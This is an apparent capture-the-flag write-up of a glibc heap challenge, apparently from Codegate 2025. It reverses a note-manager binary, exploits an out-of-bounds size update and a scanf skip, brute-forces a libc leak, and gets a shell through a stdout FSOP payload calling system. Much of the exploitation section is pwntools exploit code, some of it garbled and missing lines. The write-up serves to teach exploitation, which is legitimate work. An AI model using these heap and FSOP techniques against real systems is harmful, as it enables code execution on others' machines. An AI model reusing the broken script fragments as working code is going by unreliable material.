## Reversing

Since we were given a binary, the first part was idenitifying the bugs by reversing the binary. I loaded the binary in IDA and found the following:

```c:decomp_main.c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  init(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      __isoc99_scanf("%d", &v3);
      if ( v3 != 3 )
        break;
      delete();
    }
    if ( v3 <= 3 )
    {
      if ( v3 == 1 )
      {
        create();
      }
      else if ( v3 == 2 )
      {
        edit();
      }
    }
  }
}
```

The main function looked fairly simple as would that of a normal heap-chall menu-driven program.

Looking at the menu, we quickly found that we have 3 options:

| Option | Task   |
| ------ | ------ |
| 1      | Create |
| 2      | Edit   |
| 3      | Delete |

One quick thing I noticed off the bat was the lack of a `view/read` function that would allow us to read the contents of the chunk. Then, I started to hunt for the bug(s).

### 1. Out-of-Bound Write by re-updating the size field.

The first bug was in the `create` function.

```c:decomp_create.c
unsigned __int64 create()
{
  int curr_idx; // ebx
  int idx; // [rsp+0h] [rbp-30h] BYREF
  unsigned int key; // [rsp+4h] [rbp-2Ch] BYREF
  note *current_chunk; // [rsp+8h] [rbp-28h]
  void *buf; // [rsp+10h] [rbp-20h]
  unsigned __int64 v6; // [rsp+18h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  key = 0;
  printf("Index: ");
  __isoc99_scanf("%d", &idx);
  if ( idx < 0 || idx > 15 )
  {
LABEL_9:
    puts("Error");
    return v6 - __readfsqword(0x28u);
  }
  if ( !chunks[idx] )
  {
    curr_idx = idx;
    chunks[curr_idx] = (note *)malloc(0x10uLL);
  }
  printf("Key: ");
  __isoc99_scanf("%u", &key);
  if ( key <= 0x1000000 )
  {
    current_chunk = chunks[idx];
    printf("Size: ");
    __isoc99_scanf("%d", &current_chunk->size);
    if ( (int)current_chunk->size <= 0x400 )
    {
      buf = malloc((int)current_chunk->size);
      if ( buf )
      {
        printf("Data: ");
        read(0, buf, (int)current_chunk->size);
        current_chunk->buf = (char *)buf;
        current_chunk->key = key;
        puts("Save completed");
        return v6 - __readfsqword(0x28u);
      }
    }
    goto LABEL_9;
  }
  printf("Error");
  return v6 - __readfsqword(0x28u);
```

Here, what the function is doing is it firstly asks for an index where you'll store the note. The layout of a note is:

```c
struct note // sizeof=0x10
{
    char *buf;
    unsigned int size;
    unsigned int key;
};
```

Index is a signed int but the if condition also checks for a case when `idx <= 0` so relative-oob wouldn't work here. And the max index allowed is `0xF`.
After this, the program checks:

```c
if ( !chunks[idx] )
{
    curr_idx = idx;
    chunks[curr_idx] = (note *)malloc(0x10uLL);
}
```

If a chunk doesn't exist at the specified index in the chunks array, it simply allocates a new chunk of size `0x10` to store the metadata of the chunk.

The next check is for the key and if `key <= 0x1000000`, it proceeds further and asks for the size. Now the actual bug is in the following block:

```c
current_chunk = chunks[idx];
printf("Size: ");
__isoc99_scanf("%d", &current_chunk->size);
if ( (int)current_chunk->size <= 0x400 )
{
    ...
}
printf("Error");
return v6 - __readfsqword(0x28u);
```

Now, the bug here is that, it fetches the metadata chunk from `chunks[idx]`. And, it takes input into the size field of the chunk and after that it checks if `size <= 0x400`.
Now, in case of a scenario, if a create a chunk at index 0. Then, when we re-invoke create with index 0, what this would do, is it would update the size field of the existing
chunk, hence giving us an oob-write primitive (for this, we'll have to look at [edit](#3-4-byte-leak-in-size-by-guessing-the-key-in-edit) to).

To support this, let's debug this in gdb:

![alt text](/static/writeups/codegate-25/image-1.png)
![alt text](/static/writeups/codegate-25/image-2.png)
![alt text](/static/writeups/codegate-25/image-3.png)
![alt text](/static/writeups/codegate-25/image-4.png)

We can that size field was updated correctly, hence proving our analysis.

### 2. Improper use of scanf leading to breaking and skipping existing entries

Looking at the create function, another bug is in the `key` and `size` field:

```c
printf("Key: ");
__isoc99_scanf("%u", &key);
if ( key <= 0x1000000 )
{
    current_chunk = chunks[idx];
    printf("Size: ");
    __isoc99_scanf("%d", &current_chunk->size);
    if ( (int)current_chunk->size <= 0x400 )
    {
```

Now, the bug here is that `__isoc99_scanf("%u", &key);`, no matter what key we give it, it stores it inside the `key` variable which is a local variable. However, if we give `-` to `scanf`
when asking for size, we can esentially preserve the value at `&current_chunk->size` by just breaking scanf.

### [3.?] 4-byte leak in size by guessing the key in `edit`.

> Not really a bug but we abused this a primitive due to the first bug.

After finding the oob write primitive, I started to find a leak (only libc leak needed and we can easily get a shell). For that, I hadn't properly
analyzed the rest of the binary and thought that it was leakless binary, so I talked to my teammates on a discord call ([hexamine](https://github.com/hexamine22) and [rootxran](https://github.com/rootxran)),
with very small context, they recommended [House of Water](https://github.com/shellphish/how2heap/blob/master/glibc_2.36/house_of_water.c).
I decided to read up on it but actually decided to reverse the edit function:

```c:decomp_edit.c
unsigned __int64 edit()
{
  int idx; // [rsp+8h] [rbp-18h] BYREF
  int key; // [rsp+Ch] [rbp-14h] BYREF
  note *curr_chunk; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  key = 0;
  printf("Index: ");
  __isoc99_scanf("%d", &idx);
  if ( idx >= 0
    && idx <= 15
    && (curr_chunk = chunks[idx]) != 0LL
    && curr_chunk->buf
    && (printf("Key: "), __isoc99_scanf("%u", &key), curr_chunk->key == key) )
  {
    printf("Data(%d): ", curr_chunk->size);
    read(0, curr_chunk->buf, (int)curr_chunk->size);
    puts("Edit completed");
  }
  else
  {
    puts("Error");
  }
  return v4 - __readfsqword(0x28u);
}
```

Now, keeping in mind the previous out-of-bound write bug. I created the following chunk in my mind:

```c
0x555555559290	0x0000000000000000	0x0000000000000421
0x5555555592a0	0x00007fffffff92c0	0x00007fffffff92c0
0x5555555592a0	0x0000000000000000  0x0000000000000000
```

Now, suppose that this chunk was at index `0`. So, then the note would be:

```
buf  => 0x00007fffffff92c0
size => 0xffff92c0
key  => 0x00007fff
```

So, in the edit primitive:

```c
(printf("Key: "), __isoc99_scanf("%u", &key), curr_chunk->key == key) )
{
    printf("Data(%d): ", curr_chunk->size);
    ...
}
else
{
    puts("Error");
}
```

Now, keeping the chunk we created in mind, we can see that the comparison; if fails, simply returns error. If it succeeeds, it would print the size field.
So, we can actually get the entire libc leak by simply bruteforcing the key, i.e. we have to do a bruteforce from `0x7e00` to `0x7fff`, so it isn't that big of a number and
we can easily bruteforce it.

## Exploitation

Now that we know the bugs, let's note the plan of action:

- Using the [first](#1-out-of-bound-write-by-re-updating-the-size-field) bug to get oob-write.
- Make 3 chunks point to the same buf by overwriting the last-byte of `*buf` using oob-write.
- Edit size field of a chunk to free into tcache and unsorted-bin.
- Allocate that chunk into the metadata whilst making use of [scanf bug](2-improper-use-of-scanf-leading-to-breaking-and-skipping-existing-entries) to preserve existing data (libc leak)
- Brute-force the key to get a full libc leak
- Overwrite the \*buf of any of the chunks to gain a good write on stdout and get shell when `puts` is invoked after the `edit` call.

Now, the base-exploit looks like the following:

```py:exploit.py
#!/usr/bin/env python3

from pwn import *
from tqdm import *
context.terminal = ["tmux", "splitw", "-h"]

encode    = lambda e: e if type(e) == bytes else str(e).encode()

fixleak   = lambda l: unpack((l[:-1] if (l[-1] == b'\n' or l[-1] == '\n') else l).ljust(8, b"\x00"))
rfixleak  = lambda l: unpack((l[:-1] if (l[-1] == b'\n' or l[-1] == '\n') else l).rjust(8, b"\x00"))
_base_    = lambda a: a[0].split(':') if ':' in a[0] else a
parse     = lambda a: _base_(a[2:] if (a and a[1] == 'nc') else a[1:])

        if _input and not _exe: input("Continue?")

exe = "./prob_patched"

    ) if args.REMOTE else process(argv=[exe], aslr=False)

def menu(idx):

    info("got edit size: %d" % sz)
    (io.sendlineafter if ln else io.sendafter)(b": ", (data))
    return sz

def delete(idx, key):
    menu(3)
    io.sendlineafter(b": ", encode(idx))
    io.sendlineafter(b": ", encode(key))
```

Now, let's look at the heap state by allocating 5 chunks:

```py
create(0x0, 0xF, 0x10, b"AAAAAAAA")
create(0x1, 0xF, 0x10, b"BBBBBBBB")
create(0x2, 0xF, 0x10, b"CCCCCCCC")
create(0x3, 0xF, 0x400, b"DDDDDDDD"
create(0x4, 0xF, 0x10, b"GUARD1"))
```

> We need to have 1 guard-allocation to prevent forward consolidation with the top chunk.

![heap-state](/static/writeups/codegate-25/image-5.png)

Now, if we were to look closely, `chunks[0x1]->buf`, `chunks[0x2]->buf` and `chunks[0x3]->buf` have a one-byte difference between each of them.
What we actually need to is we need to overwrite the size field of one of the chunks to `0x431` so that when they're free'd, they go into the unsorted
bin. But, we also want another chunk inside the chunks array to point to the same chunk that's in unsorted bin so we can actually bruteforce the key
and gain libc leak. One of the ways we can do that is that if we overwrite the last byte of `chunks[0x1]->buf` to point to `chunks[0x3]->buf`
and same for `chunks[0x2]->buf` to `chunks[0x3]->buf`. Inside the delete function:

```c:decomp_delete
free(ptr->buf);
ptr->buf = 0LL;
ptr->key = 0;
ptr->size = 0;
free(ptr);
chunks[idx] = 0LL;
```

The first thing that is free'd is the `ptr->buf` and then the `ptr` itself is free'd. So, if `chunks[0x3]->buf` has a size of `0x21`, it would be free'd
into the `0x20` tcache, from which the `metadata` actually allocates. After this, if we allocate a new chunk, it would allocate the metadata on this chunk.
Then, if we were to re-update the size field from `0x21` to `0x421`, then when we free it from `chunks[0x3]`, it would now be free'd into the unsorted bin.

Moving step-by-step, let's start out by simply overwriting the size field of the `chunks[0x3]->buf` to `0x21`. To do that, I will do oob-write on `chunks[0x0]`,
overwrite the lsb of `chunks[0x1]->buf` to point to this chunk and then simply update the size field.

```py
create(0x0, 0xF, 0x10000) # oob-primitive
payload = flat(
    cyclic(0x18, n=8),
    0x21,     # size,
    p8(0x78), # points to size of 0x411 chunk
)
edit(0x0, 0xF, payload, ln=False)
```

This esentially overwrites the `chunk[0x1]->buf`'s lsb to point to the size field:

![before](/static/writeups/codegate-25/image-6.png)
![after](/static/writeups/codegate-25/image-7.png)

Now, when we do edit on `chunks[0x1]`, it would update the size field of `chunks[0x3]->buf`.

```py
edit(0x1, 0xF, p64(0x21), ln=False)
```

![updated size](/static/writeups/codegate-25/image-8.png)

Now, we'll simply free this chunk and it will go into the `0x20` tcache:

```py
delete(0x3, 0xF)
```

![deleted-chunks](/static/writeups/codegate-25/image-9.png)

Now, since we have two chunks, and the chunk we want to poison actually is `0x1` in tcache, we'll allocate two more chunks.
But this time, the first chunk will be allocated of `size > 0x20` to prevent our poisoned chunk from being allocated as `buf` rather than `note`.

```py
create(0x3, 0xF, 0x20, b"EEEEEEEE")
create(0x5, 0xF, 0x10, b"FFFFFFFF") # <= Poisoned chunk
```

![New allocations](/static/writeups/codegate-25/image-10.png)

Now, the next step is that we can simply update the size field back to `0x431` and then update the pointer of `chunks[0x1]->buf` to point to this chunk (`0x80`).
Then, when we free `0x1`, this would now go into the unsorted bin. And then, `chunks[0x5]` will help us in gaining leaks.

```py
edit(0x1, 0xF, p64(0x431), ln=False)
payload = flat(
    cyclic(0x18, n=8),
    0x21, # size,
    p8(0x80), # points to size of chunks[0x5]
)
edit(0x0, 0xF, payload, ln=False)
delete(0x1, 0xF)
```

![unsorted-bin](/static/writeups/codegate-25/image-11.png)

Now, that we have the libc leak in the `chunks[0x5]` metadata, the only thing we need to do is write a function that will simply bruteforce the upper 2-bytes of libc
to get a stable leak. Once we have that, we get the remaining 4-bytes when the size is printed. For that, I wrote the following function:

```py:brute_force_leak.py
def brute_force_key(idx):
    """
    What we're doing here is simple.
    Using the edit primitive, we can bruteforce
    one byte of the key. We know that 0x7f will
    be there We'll start from 0x7800 -> 0x7fff
    """
    info("Bruteforcing key...")
    for key in tqdm(range(0x7800, 0x7fff)):
        menu(2)
        io.sendlineafter(b": ", encode(idx))
        io.sendlineafter(b": ", encode(key))
        msg = io.recv(5)
        if b"Error" in msg:
            continue
        leak = hex(int(io.recvuntil(b")")[:-1]) & 0xFFFFFFFF)[2:]
        key = hex(key)[2:]
        leak = hexleak(key+leak)
        info("leak @ %#x" % leak)
        rcv = io.recv(5, timeout=1)
        if len(rcv) < 5:
            io.send(b"\x00") # let's not modify anything.
        return leak
```

> I usually develop my exploits with `aslr=False`, as can be seen from the screenshots but moving forward, to make sure the exploit works, I do `aslr=True`.

The only thing that we need to pass into this function is the index where our poisoned chunk resides, in our case, it is `0x5`:

```py
libc.address = brute_force_key(0x5) - 0x219ce0
info("libc @ %#x" % libc.address)
```

![libc leak](/static/writeups/codegate-25/image-12.png)

Now that we have the libc leak, the rest of the problem becomes much much simpler. As we can now easily gain arb-write in libc.

However, there was no `exit` in the program. So the only thing that I found was most simplest was using `stdout` fsop. Looking at the edit function:

```c:decomp_edit.c
read(0, curr_chunk->buf, (int)curr_chunk->size);
puts("Edit completed");
```

We can see that, `puts` is called immediately after `read`. Prying open `puts`:

![puts-relative-vtable-call](/static/writeups/codegate-25/image-13.png)

We can see that if we were to hijack the vtable and points `r14` to point to `&vtable['_IO_wfile_overflow']-0x38`, it would allow us to gain a good primitive.

> For more details on FSOP, I'm writing an insanely detailed guide which I hope I will be able to complete in a few months.

But after this, I just copied the stub that I have setup myself, modified a few offsets to cater puts and then this time, instead of overwriting one-byte,
I overwrote the entire `*buf` to point to stdout and overwrote the size field as well.

```py
info("stdout @ %#x" % libc.sym._IO_2_1_stdout_)
fake_chunk = flat(
    cyclic(0x10, n=8),
    p64(0x20),
    p64(0x21),                     # size
    p64(libc.sym._IO_2_1_stdout_), # *buf
    p32(0x1000),                   # size
    p32(0xf)                       # key
)
create(0x1, 0xF, 0x10, b"GGGGGGGG")
edit(0x0, 0xF, fake_chunk, ln=False)
```

![arb-write](/static/writeups/codegate-25/image-14.png)

Now, if we just edit `0x1`, we gain code execution:

```py
vtable = libc.sym._IO_wfile_jumps
io_file = libc.sym._IO_2_1_stdout_

info("vtable @ %#x" % vtable)
info("system @ %#x" % libc.sym.system)
payload = flat(
    unpack(b" sh".ljust(8, b"\x00")),
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, b"AAAAAAAA", 0x00, 0x0, 0x0, libc.sym.system,
    0x0, 0x0, 0x00, io_file+0x8, 0x00,
    b"CCCCCCCC", (io_file+0x8),
    0x0, 0x0, 0x0, 0x0, 0x0, io_file,
    vtable)
edit(0x1, 0xF, payload, ln=False)
```

![shell](/static/writeups/codegate-25/image-15.png)

However, when I kept trying this against the remote, I kept facing issues:

![remote](/static/writeups/codegate-25/image-16.png)

To debug the issue, I installed gdb server inside the docker container, ran my exploit and then attached gdb to the process (implementation inside the `attach` method in the exploit)

![alt text](/static/writeups/codegate-25/image-17.png)

Now, while the program waits, go inside docker container and run the following command:

```bash
gdbserver :1234 --attach `pidof prob`

After debugging, I found out that the offset of vtable where `__IO_wfile_overflow` was different on remote. I fixed that (it was off by `0x20`)

![vtable-offset-error](/static/writeups/codegate-25/image-19.png)

![fix](/static/writeups/codegate-25/image-20.png)

The other issue was, when `call qword ptr [rax + 0x68]` happens inside the `_IO_wdoallocbuf`, even though we stored address of `system`, there was a meaningless
address stored there.

![alt text](/static/writeups/codegate-25/image-22.png)

Now, what I did here was simply get the offset of `system` from remote and then just call that:

![system](/static/writeups/codegate-25/image-23.png)

I just updated my payload as follows:

```diff
- 0x00, b"AAAAAAAA", 0x00, 0x0, 0x0, libc.sym.system,
+ 0x00, b"AAAAAAAA", 0x00, 0x0, 0x0, (libc.address + 0x50d70 if args.REMOTE else libc.sym.system),
```

Now, rerunning the exploit on remote I faced the exact same issue. I decided to check the libc base:

![libc base](/static/writeups/codegate-25/image-24.png)

Oddly enough, the base I got was `+0x1000`. But, for some reason, the vtable offset and stdout offsets were correct. The only thing that was messed up was
system's address. Weird. So, I subtracted `0x1000` from the system offset and got this payload:

```diff
- 0x00, b"AAAAAAAA", 0x00, 0x0, 0x0, (libc.address + 0x50d70 if args.REMOTE else libc.sym.system),
+ 0x00, b"AAAAAAAA", 0x00, 0x0, 0x0, (libc.address + 0x4fd70 if args.REMOTE else libc.sym.system),
```

Now, we got the shell!

> Getting the shell on the actual remote took some time because the servers were in Korea and the latency was real.
